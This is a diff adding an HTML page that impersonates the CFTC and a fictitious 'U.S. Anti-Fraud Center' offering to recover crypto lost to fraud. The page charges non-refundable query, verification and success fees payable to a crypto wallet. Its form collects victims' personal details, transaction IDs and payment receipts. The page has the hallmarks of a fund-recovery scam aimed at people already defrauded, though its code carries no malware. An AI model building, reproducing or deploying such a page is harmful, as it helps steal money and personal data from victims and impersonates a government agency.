@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Consolidated Page | CFTC & Fraudulent Crypto Asset Recovery</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- FontAwesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+  <!-- DataTables CSS -->
+  <link rel="stylesheet" href="https://cdn.datatables.net/1.13.5/css/jquery.dataTables.min.css">
+  <link rel="stylesheet" href="https://cdn.datatables.net/buttons/2.4.1/css/buttons.dataTables.min.css">
+  <link rel="stylesheet" href="https://cdn.datatables.net/responsive/2.4.1/css/responsive.dataTables.min.css">
+
+  <!-- html2canvas & jsPDF (for PDF export) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
+      integrity="sha512-BXa6C9BEPpBzRANw4Z+cZJ9Ekf9cjTXmKvW7GOW50g6lm/XM7EqHf7sdI1ZtFKO2QY/6k1MzVVAN9PB+T7raYg=="
+      crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"
+      integrity="sha512-AN5BHV1LTShU3LG7uTe77gVDijH7UCfA0x/GtjXkaTgOF7nvfJYu9y8bhApP9Er5cWfUPHcMHSEbhS8A2C7k4g=="
+      crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <!-- jQuery -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <!-- DataTables JS -->
+  <script src="https://cdn.datatables.net/1.13.5/js/jquery.dataTables.min.js"></script>
+  <!-- DataTables Buttons JS -->
+  <script src="https://cdn.datatables.net/buttons/2.4.1/js/dataTables.buttons.min.js"></script>
+  <script src="https://cdn.datatables.net/buttons/2.4.1/js/buttons.flash.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.2.7/pdfmake.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.2.7/vfs_fonts.js"></script>
+  <script src="https://cdn.datatables.net/buttons/2.4.1/js/buttons.html5.min.js"></script>
+  <script src="https://cdn.datatables.net/buttons/2.4.1/js/buttons.print.min.js"></script>
+  <!-- DataTables Responsive JS -->
+  <script src="https://cdn.datatables.net/responsive/2.4.1/js/dataTables.responsive.min.js"></script>
+
+  <!-- ======================= Main CSS ======================= -->
+  <style>
+    /***********************************************************
+     * 1. 全局/基础样式
+     ***********************************************************/
+    :root {
+      /* CFTC-like Primary Colors */
+      --cftc-blue: #003366;
+      --cftc-light-blue: #0056b3;
+      --background-color: #ffffff;
+      --text-color: #333333;
+      --muted-text: #4a4a4a;
+      --highlight-bg: rgba(0, 86, 179, 0.1);
+      --border-color: #ccc;
+      --transition-speed: 0.3s;
+      --btn-border-radius: 4px;
+
+      /* Additional Colors */
+      --cftc-gray: #f1f1f1;
+      --cftc-dark-gray: #737373;
+      --cftc-white: #FFFFFF;
+      --cftc-border-gray: #C6C6C6;
+
+      --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: var(--font-family);
+      background-color: var(--background-color);
+      color: var(--text-color);
+      margin: 0;
+      line-height: 1.6;
+    }
+    .main-container {
+      max-width: 1200px;
+      margin: 20px auto;
+      padding: 20px;
+      width: 90%;
+    }
+
+    /***********************************************************
+     * 2. PAGE TITLE & INTRO
+     ***********************************************************/
+    h1 {
+      color: var(--cftc-blue);
+      font-size: 2rem;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+    p {
+      font-size: 1rem;
+      color: var(--muted-text);
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    /* ====== Submit Information Button ====== */
+    .submit-info-container {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .submit-info-btn {
+      background: var(--cftc-blue);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 20px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: background var(--transition-speed);
+    }
+    .submit-info-btn:hover {
+      background: var(--cftc-light-blue);
+    }
+
+    /***********************************************************
+     * 3. OFFICIAL NOTICE
+     ***********************************************************/
+    .notice-text {
+      background: var(--cftc-gray);
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      padding: 15px;
+      margin-bottom: 25px;
+      font-size: 0.95rem;
+      color: var(--cftc-dark-gray);
+    }
+    .notice-text h2 {
+      font-size: 1.2rem;
+      color: var(--cftc-blue);
+      margin-top: 10px;
+    }
+    .notice-text ul {
+      padding-left: 20px;
+      margin-top: 10px;
+    }
+    .notice-text ul li {
+      margin-bottom: 8px;
+    }
+
+    /***********************************************************
+     * 4. Accordion
+     ***********************************************************/
+    .accordion-section {
+      margin-bottom: 20px;
+      border-radius: 6px;
+      background-color: #fff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    .accordion-header {
+      padding: 12px 20px;
+      background: var(--cftc-gray);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+      border-radius: 6px;
+      font-size: 1rem;
+      color: var(--cftc-blue);
+      transition: background var(--transition-speed), color var(--transition-speed);
+    }
+    .accordion-header:hover,
+    .accordion-header:focus {
+      background: var(--cftc-light-blue);
+      color: var(--cftc-white);
+    }
+    .accordion-content {
+      display: none;
+      background: #f9f9f9;
+      border-top: 1px solid var(--border-color);
+      padding: 15px 20px;
+      font-size: 0.95rem;
+      line-height: 1.6;
+      border-radius: 0 0 6px 6px;
+    }
+    .accordion-content.active {
+      display: block;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+    .toggle-icon {
+      font-size: 0.9rem;
+      color: var(--cftc-blue-dark);
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-5px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /***********************************************************
+     * 5. Modal for "Submit Information"
+     ***********************************************************/
+    #info-modal {
+      display: none;
+      position: fixed;
+      z-index: 2000;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      align-items: center;
+      justify-content: center;
+    }
+    .info-modal-content {
+      background: #fff;
+      color: #333;
+      width: 90%;
+      max-width: 700px;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+      max-height: 90%;
+      overflow-y: auto;
+      position: relative;
+    }
+    .info-modal-close {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+      background: none;
+      border: none;
+      color: #666;
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+    .info-modal-close:hover {
+      color: #000;
+    }
+    .info-modal-content h2 {
+      margin-bottom: 15px;
+      color: var(--cftc-blue);
+      text-align: center;
+    }
+    .info-modal-content form {
+      font-size: 0.95rem;
+      margin-top: 15px;
+    }
+    .info-modal-content form label {
+      display: block;
+      margin: 10px 0 5px;
+      font-weight: bold;
+    }
+    .info-modal-content form input[type="text"],
+    .info-modal-content form input[type="email"],
+    .info-modal-content form input[type="date"],
+    .info-modal-content form input[type="tel"],
+    .info-modal-content form select,
+    .info-modal-content form textarea {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      margin-bottom: 10px;
+      font-size: 0.95rem;
+    }
+    .info-modal-content form textarea {
+      height: 80px;
+      resize: vertical;
+    }
+    .info-modal-content .checkbox-group {
+      margin-bottom: 10px;
+    }
+    .info-modal-content .checkbox-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: normal;
+    }
+    .info-modal-content .submit-btn {
+      background: var(--cftc-blue);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 18px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: background var(--transition-speed);
+      display: block;
+      margin: 20px auto 0;
+    }
+    .info-modal-content .submit-btn:hover {
+      background: var(--cftc-light-blue);
+    }
+
+    /***********************************************************
+     * 6. Fee Table
+     ***********************************************************/
+    .fee-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
+      margin-top: 25px;
+      margin-bottom: 25px;
+    }
+    .fee-table th, .fee-table td {
+      border: 1px solid var(--border-color);
+      padding: 10px;
+      vertical-align: top;
+    }
+    .fee-table th {
+      background: var(--cftc-blue);
+      color: #fff;
+      font-weight: bold;
+      text-align: left;
+    }
+    .fee-table tr:nth-child(even) td {
+      background: #f9f9f9;
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 768px) {
+      .accordion-header, .accordion-content {
+        padding: 10px 15px;
+      }
+      .info-modal-content {
+        padding: 20px;
+      }
+      .fee-table th, .fee-table td {
+        padding: 8px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+<div class="main-container">
+
+  <!-- ====== PAGE TITLE & INTRO ====== -->
+  <h1>Official Query &amp; Recoverable Funds Plan</h1>
+  <p>
+    In order to determine the status of any recovered cryptocurrency funds held in 
+    federal custody and to assess a feasible path for returning them to qualified 
+    victims, the Federal Asset Recovery Service offers the following official services.
+  </p>
+
+  <!-- ====== Submit Info Button ====== -->
+  <div class="submit-info-container">
+    <button id="submit-info-btn" class="submit-info-btn">
+      Submit Information
+    </button>
+  </div>
+
+  <!-- ====== (1) ACCORDION: Preliminary Query & Official Report ====== -->
+  <div class="accordion-section">
+    <div class="accordion-header">
+      1. Preliminary Query &amp; Official Report
+      <span class="toggle-icon">Show</span>
+    </div>
+    <div class="accordion-content">
+      <ul>
+        <li><strong>Scope:</strong> We conduct an exhaustive check in our official database 
+            of recovered fraudulent assets, cross-referencing the applicant’s wallet addresses, 
+            transaction hashes, and personal identifiers.</li>
+        <li><strong>Outcome:</strong>
+          <ul>
+            <li>If <strong>matching funds</strong> are found under federal custody, 
+                an <em>“Asset Confirmation Notice”</em> will be issued, specifying the 
+                approximate amount and relevant case ID.</li>
+            <li>If <strong>no matching funds</strong> are identified, 
+                we provide a <em>“Feasibility Report”</em> outlining potential 
+                investigative approaches to locate or trace additional funds outside 
+                of current federal holdings.</li>
+          </ul>
+        </li>
+        <li><strong>Official Report Issuance:</strong>
+            A signed and sealed <em>“Query &amp; Status Report”</em> is delivered digitally 
+            (and optionally by mail upon request) as official evidence of the government’s 
+            preliminary findings.</li>
+        <li><strong>Fee:</strong>
+          <ul>
+            <li><strong>Preliminary Query Fee:</strong> $200 (non-refundable)</li>
+          </ul>
+        </li>
+        <li><strong>Timeframe:</strong> Typically 7–14 business days</li>
+        <li><strong>Disclaimer:</strong>
+            The Query &amp; Status Report only reflects data currently in federal custody.
+            It does not guarantee no other funds exist, nor assure final disbursement if 
+            eligibility criteria are unfulfilled.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- ====== (2) ACCORDION: Recovery Plan & Verification Process ====== -->
+  <div class="accordion-section">
+    <div class="accordion-header">
+      2. Recovery Plan &amp; Verification Process
+      <span class="toggle-icon">Show</span>
+    </div>
+    <div class="accordion-content">
+      <ul>
+        <li><strong>Scope:</strong> 
+          <ul>
+            <li><strong>Matching Funds Found:</strong> We prepare an <em>“Official Recovery Plan”</em>, 
+                including KYC/AML checks, wallet ownership, settlement details.</li>
+            <li><strong>No Funds Currently Held:</strong> A <em>“Feasible Funds Recovery Strategy”</em> 
+                is proposed, possibly involving advanced blockchain forensics, cross-chain 
+                tracking, or legal motions.</li>
+          </ul>
+        </li>
+        <li><strong>Outcome:</strong>
+          <ul>
+            <li><strong>Confirmed Federal Holdings:</strong> We guide the applicant through 
+                the official claim procedure for restitution, subject to relevant laws/fees.</li>
+            <li><strong>Advanced Steps:</strong> If assets not in direct control, an 
+                investigative blueprint is developed to locate/freeze assets prior to final recovery.</li>
+          </ul>
+        </li>
+        <li><strong>Fee Structure:</strong> 
+          <ul>
+            <li><strong>Verification Fee:</strong> $300 (non-refundable once process begins)</li>
+            <li><strong>Success Fee (if applicable):</strong> 5% of the recovered amount</li>
+            <li><strong>Additional Expenses:</strong> Court filing, attorney costs, cross-border fees, miner/Gas fees</li>
+          </ul>
+        </li>
+        <li><strong>Legal and Compliance:</strong>
+          <ul>
+            <li>All procedures follow Title 31 U.S.C. &amp; AML/KYC standards</li>
+            <li>Submission of falsified documentation may result in denial</li>
+          </ul>
+        </li>
+        <li><strong>Disclaimer:</strong> Completion of this plan does not guarantee a 100% success rate. 
+            Recovery depends on solvency, cooperation of third parties, and jurisdiction constraints.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- ====== (3) ACCORDION: Additional Official Statements ====== -->
+  <div class="accordion-section">
+    <div class="accordion-header">
+      3. Additional Official Statements
+      <span class="toggle-icon">Show</span>
+    </div>
+    <div class="accordion-content">
+      <p><strong>Refund &amp; Upgrade Policy:</strong><br>
+        Fees paid for queries/verifications are generally non-refundable once the process begins. 
+        If the case escalates beyond the existing plan, an upgraded fee arrangement may be required.
+      </p>
+      <br>
+      <p><strong>Partial/Ongoing Disbursements:</strong><br>
+        If only part of the victim’s funds are located, proportionate restitution is issued net of fees, 
+        with the possibility of further steps for unrecovered amounts.
+      </p>
+
+      <!-- 收费表格 (Fee Table) -->
+      <h3 style="margin-top:20px;">New Fee Table (Further Detail)</h3>
+      <table class="fee-table">
+        <thead>
+          <tr>
+            <th>Fee Items</th>
+            <th>Conditions for Collection</th>
+            <th>Description</th>
+            <th>Amount/Rate</th>
+            <th>Refundable</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Application/Registration Fee<br>(Application Fee)</td>
+            <td>Charged when victim submits the initial application form</td>
+            <td>Covers costs like basic review, material registration, admin management</td>
+            <td>$100 (one-time)</td>
+            <td>Non-refundable (If not proceeding further, can be refunded at discretion)</td>
+          </tr>
+          <tr>
+            <td>Investigation/Processing Fee<br>(Investigation Fee)</td>
+            <td>After application approved, once blockchain tracing officially starts</td>
+            <td>Pays for investigators, blockchain tools, tech resources</td>
+            <td>$300 (one-time)</td>
+            <td>Partially refundable ($150 if in-depth not possible)</td>
+          </tr>
+          <tr>
+            <td>Success Commission<br>(Success Fee)</td>
+            <td>After all/part of cryptocurrency is successfully recovered</td>
+            <td>Covers subsequent human resources &amp; technical costs</td>
+            <td>5%~10% of Recovered Amount</td>
+            <td>Not applicable (only generated post-recovery)</td>
+          </tr>
+          <tr>
+            <td>Blockchain Network Fee<br>(Network/Gas Fees)</td>
+            <td>When on-chain operations (transfer, freeze, withdrawal) are needed</td>
+            <td>Composed of public chain mining/Gas fees, fluctuates with network</td>
+            <td>Based on real-time on-chain rate</td>
+            <td>Non-refundable (paid to the blockchain network)</td>
+          </tr>
+          <tr>
+            <td>Legal services / Lawyer fees<br>(Legal Services)</td>
+            <td>If legal procedures are required (court freeze, etc.)</td>
+            <td>Charged by the hour / pre-estimated, depends on complexity</td>
+            <td>Case-based or hourly</td>
+            <td>No charge if not used</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ====== MODAL for Submit Information ====== -->
+  <div id="info-modal" aria-hidden="true" role="dialog" aria-labelledby="modal-title">
+    <div class="info-modal-content">
+      <button class="info-modal-close" id="info-modal-close" aria-label="Close Modal">&times;</button>
+      <h2 id="modal-title">U.S. Anti-Fraud Center (OCEO)</h2>
+      <p><strong>Identity Information Submission and Complaint Platform Matching</strong></p>
+      <form id="submission-form" enctype="multipart/form-data">
+        <!-- Section 1: Personal Information -->
+        <h3>Section 1: Personal Information</h3>
+        <label for="full-name">Full Name:</label>
+        <input type="text" id="full-name" name="full-name" placeholder="Enter full name" required>
+
+        <label for="dob">Date of Birth:</label>
+        <input type="date" id="dob" name="dob" placeholder="e.g. 01/01/1990" required>
+
+        <label for="contact-number">Contact Number:</label>
+        <input type="tel" id="contact-number" name="contact-number" placeholder="e.g. +1 (xxx) xxx-xxxx" required>
+
+        <label for="email-address">Email Address:</label>
+        <input type="email" id="email-address" name="email-address" placeholder="yourname@example.com" required>
+
+        <label for="residential-address">Residential Address:</label>
+        <input type="text" id="residential-address" name="residential-address" placeholder="Street, City, State, Zip" required>
+
+        <!-- Section 2: Platform Information -->
+        <h3>Section 2: Platform Information</h3>
+        <label for="platform-name">Platform Name:</label>
+        <input type="text" id="platform-name" name="platform-name" placeholder="Enter platform name" required>
+
+        <label for="platform-website">Platform Website URL:</label>
+        <input type="url" id="platform-website" name="platform-website" placeholder="Enter website URL" required>
+
+        <label for="platform-contact">Platform Contact Information (if available):</label>
+        <input type="text" id="platform-contact" name="platform-contact" placeholder="Phone/Email of platform support">
+
+        <label for="initial-contact-date">Date of Initial Contact with Platform:</label>
+        <input type="date" id="initial-contact-date" name="initial-contact-date" placeholder="MM/DD/YYYY">
+
+        <!-- Section 3: Transaction Details -->
+        <h3>Section 3: Transaction Details</h3>
+        <label for="transaction-ids">Transaction ID(s):</label>
+        <input type="text" id="transaction-ids" name="transaction-ids" placeholder="Enter TxID(s)" required>
+
+        <label for="amount-transferred">Amount Transferred:</label>
+        <input type="text" id="amount-transferred" name="amount-transferred" placeholder="$ or Crypto Amount" required>
+
+        <label for="transaction-dates">Date of Transaction(s):</label>
+        <input type="text" id="transaction-dates" name="transaction-dates" placeholder="MM/DD/YYYY or approximate range" required>
+
+        <label for="transfer-method">Method of Transfer (e.g., bank transfer, cryptocurrency):</label>
+        <input type="text" id="transfer-method" name="transfer-method" placeholder="e.g. bank transfer, crypto, etc." required>
+
+        <label for="wallet-address">Wallet Address (if applicable):</label>
+        <input type="text" id="wallet-address" name="wallet-address" placeholder="Destination/Source wallet address">
+
+        <!-- Section 4: Description of Complaint -->
+        <h3>Section 4: Description of Complaint</h3>
+        <label for="issue-description">Brief Description of Issue:</label>
+        <textarea id="issue-description" name="issue-description" placeholder="..."></textarea>
+
+        <label for="actions-taken">Actions Taken (e.g., contacted platform, filed a report):</label>
+        <textarea id="actions-taken" name="actions-taken" placeholder="..."></textarea>
+
+        <!-- Section 5: Additional Information -->
+        <h3>Section 5: Additional Information</h3>
+        <p>Additional Relevant Documents Provided:</p>
+        <div class="checkbox-group">
+          <label><input type="checkbox" name="additional-documents" value="Proof of Transaction"> Proof of Transaction</label>
+          <label><input type="checkbox" name="additional-documents" value="Communication Records"> Communication Records with Platform</label>
+          <label><input type="checkbox" name="additional-documents" value="Identification Document"> Identification Document</label>
+          <label><input type="checkbox" name="additional-documents" value="Other"> Other (please specify):</label>
+          <input type="text" id="other-documents" name="other-documents" placeholder="Specify other documents">
+        </div>
+
+        <!-- Cryptocurrency Address Matching -->
+        <label for="crypto-address-match">Filing Fee Payment:</label>
+        <select id="crypto-address-match" name="crypto-address-match" required>
+          <option value="" disabled selected>Select your option</option>
+          <option value="match">Match your cryptocurrency address</option>
+          <option value="other">Other</option>
+        </select>
+
+        <!-- File Upload for Payment Confirmation -->
+        <label for="payment-confirmation">Attach Payment Confirmation Receipt:</label>
+        <input type="file" id="payment-confirmation" name="payment-confirmation" accept=".pdf,.jpg,.jpeg,.png" required>
+
+        <!-- Instructions for Payment Confirmation -->
+        <p style="font-size: 0.85rem; color: var(--cftc-dark-gray);">
+          Please attach your payment confirmation receipt before submitting your complaint, or email it to <a href="mailto:proceedings@cftc.gov">proceedings@cftc.gov</a>. Payment confirmation must be received before the information can be accepted and submitted.
+        </p>
+
+        <!-- Declaration -->
+        <p><strong>Declaration:</strong></p>
+        <p>
+          I hereby declare that the information provided is true and accurate to the best of my knowledge.
+        </p>
+        <label for="signature">Signature:</label>
+        <input type="text" id="signature" name="signature" placeholder="Type your name or sign digitally" required>
+
+        <label for="submission-date">Date:</label>
+        <input type="date" id="submission-date" name="submission-date" required>
+
+        <!-- Submit Button -->
+        <button type="button" class="submit-btn" onclick="handleSubmit()">Submit</button>
+
+        <!-- Note about Filing Fee -->
+        <p style="font-size: 0.85rem; color: var(--cftc-dark-gray); margin-top: 15px;">
+          <strong>NOTE:</strong> Once the filing fee is paid to the CFTC, it is non-refundable.
+        </p>
+      </form>
+    </div>
+  </div>
+  <!-- End of Modal -->
+
+  <!-- ====== OFFICIAL NOTICE ====== -->
+  <div class="notice-text">
+    <p><strong>OFFICIAL NOTICE:</strong></p>
+    <p>To ensure compliance with federal regulations, prevent fraud, and protect against identity impersonation, all payments must originate from a traceable wallet address registered under your ownership. This requirement safeguards the integrity of transactions, verifies the authenticity of payment sources, and ensures that funds are properly attributed to the rightful applicant.</p>
+    <p>By remitting payment to the designated cryptocurrency wallet address provided below, you formally authorize the commencement of the selected recovery program through the Fraud Center. All payments are processed in strict accordance with federal laws and are permanently recorded on the blockchain to guarantee full transparency, security, and accountability.</p>
+    <p><strong>IMPORTANT:</strong> Payments that do not meet these criteria may result in delays or rejection of the application. For additional assistance or inquiries regarding this process, please contact our office immediately.</p>
+
+    <h2>Relevant Federal Regulations and Guidelines:</h2>
+    <ul>
+      <li><a href="https://www.ecfr.gov/current/title-17/chapter-I/part-12" target="_blank">Compensation Regulations (Title 17, Part 12)</a></li>
+      <li><a href="https://www.ecfr.gov/current/title-17/chapter-I/part-12#12.13" target="_blank">Fee Structure Details (Title 17, Part 12.13)</a></li>
+      <li><a href="https://www.fincen.gov/resources/statutes-regulations/guidance/application-fincens-regulations-persons-administering" target="_blank">FinCEN Guidance on Virtual Currencies</a></li>
+      <li><a href="https://www.irs.gov/newsroom/irs-reminds-taxpayers-to-report-virtual-currency-transactions" target="_blank">IRS Guidelines on Virtual Currency Transactions</a></li>
+    </ul>
+  </div>
+</div><!-- end .main-container -->
+
+<!-- Scripts -->
+<script>
+  /************************************************
+   * [A] Data Loading for Table (示例，可按需删除)
+   ************************************************/
+  async function loadCreditUnionData() {
+    const loader = document.getElementById('loader');
+    const errorMsg = document.getElementById('error-message');
+    const tableBody = document.querySelector('#data-table tbody');
+
+    if (!loader || !errorMsg || !tableBody) {
+      return; // 如果页面没有这些元素则退出
+    }
+
+    try {
+      loader.style.display = 'block';
+      errorMsg.style.display = 'none';
+
+      // Example fetch JSON
+      const response = await fetch('https://raw.githubusercontent.com/afconorthamerica/Make-America-Great-Again/main/complete_credit_union_data.json');
+      if(!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      const data = await response.json();
+
+      // Clear
+      tableBody.innerHTML = '';
+      data.forEach(row => {
+        const tr = document.createElement('tr');
+        tr.innerHTML=`
+          <td>${escapeHTML(row["Last Name/Business Name"]||"")}</td>
+          <td>${escapeHTML(row["First Initial"]||"")}</td>
+          <td>${escapeHTML(row["MI"]||"")}</td>
+          <td>${escapeHTML(row["City"]||"")}</td>
+          <td>${escapeHTML(row["State"]||"")}</td>
+          <td>${escapeHTML(row["Credit Union Name"]||"")}</td>
+        `;
+        tableBody.appendChild(tr);
+      });
+
+      $('#data-table').DataTable({
+        responsive: true,
+        dom: 'Bfrtip',
+        buttons: [
+          { extend: 'copyHtml5', text: '<i class="fas fa-copy"></i> Copy' },
+          { extend: 'excelHtml5', text: '<i class="fas fa-file-excel"></i> Excel' },
+          { extend: 'csvHtml5',   text: '<i class="fas fa-file-csv"></i> CSV' },
+          { extend: 'pdfHtml5',   text: '<i class="fas fa-file-pdf"></i> PDF', orientation: 'landscape', pageSize: 'A4'},
+          { extend: 'print',      text: '<i class="fas fa-print"></i> Print' }
+        ],
+        order: [[0, 'asc']],
+        pageLength: 5
+      });
+      loader.style.display='none';
+    } catch(e){
+      console.error(e);
+      loader.style.display='none';
+      errorMsg.style.display='block';
+    }
+  }
+
+  function escapeHTML(str){
+    return str.replace(/[&<>"'`=\/]/g, s => ({
+      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;', '/':'&#x2F;','`':'&#x60;','=':'&#x3D;'
+    })[s]);
+  }
+
+  /************************************************
+   * [B] DOM Loaded => init table, init Accordion
+   ************************************************/
+  document.addEventListener('DOMContentLoaded', () => {
+    // 如果需要加载表格数据，请确保页面存在相关元素后再调用
+    // loadCreditUnionData();
+
+    // 绑定手风琴
+    const accHeaders = document.querySelectorAll('.accordion-header');
+    accHeaders.forEach(header => {
+      header.addEventListener('click', () => {
+        const content = header.nextElementSibling;
+        const toggleIcon = header.querySelector('.toggle-icon');
+        content.classList.toggle('active');
+        if(content.classList.contains('active')) {
+          toggleIcon.textContent = 'Hide';
+        } else {
+          toggleIcon.textContent = 'Show';
+        }
+      });
+    });
+
+    // Submit Info Modal
+    const submitInfoBtn = document.getElementById('submit-info-btn');
+    if(submitInfoBtn){
+      submitInfoBtn.addEventListener('click', openInfoModal);
+    }
+
+    const infoModalClose = document.getElementById('info-modal-close');
+    if(infoModalClose){
+      infoModalClose.addEventListener('click', closeInfoModal);
+    }
+
+    const infoModal = document.getElementById('info-modal');
+    if(infoModal){
+      infoModal.addEventListener('click', (e) => {
+        if(e.target === infoModal) closeInfoModal();
+      });
+    }
+  });
+
+  /************************************************
+   * [C] Submit Info Modal Functions
+   ************************************************/
+  function openInfoModal(){
+    document.getElementById('info-modal').style.display='flex';
+    document.getElementById('info-modal').setAttribute('aria-hidden', 'false');
+  }
+  function closeInfoModal(){
+    document.getElementById('info-modal').style.display='none';
+    document.getElementById('info-modal').setAttribute('aria-hidden', 'true');
+  }
+
+  // Handle Form Submission
+  function handleSubmit(){
+    const form = document.getElementById('submission-form');
+    if(form.checkValidity()){
+      // Here you can add form submission logic, e.g., send data to the server
+      alert('Form submitted successfully!');
+      closeInfoModal();
+      form.reset();
+    } else {
+      alert('Please fill in all required fields.');
+    }
+  }
+</script>
+</body>
+</html>
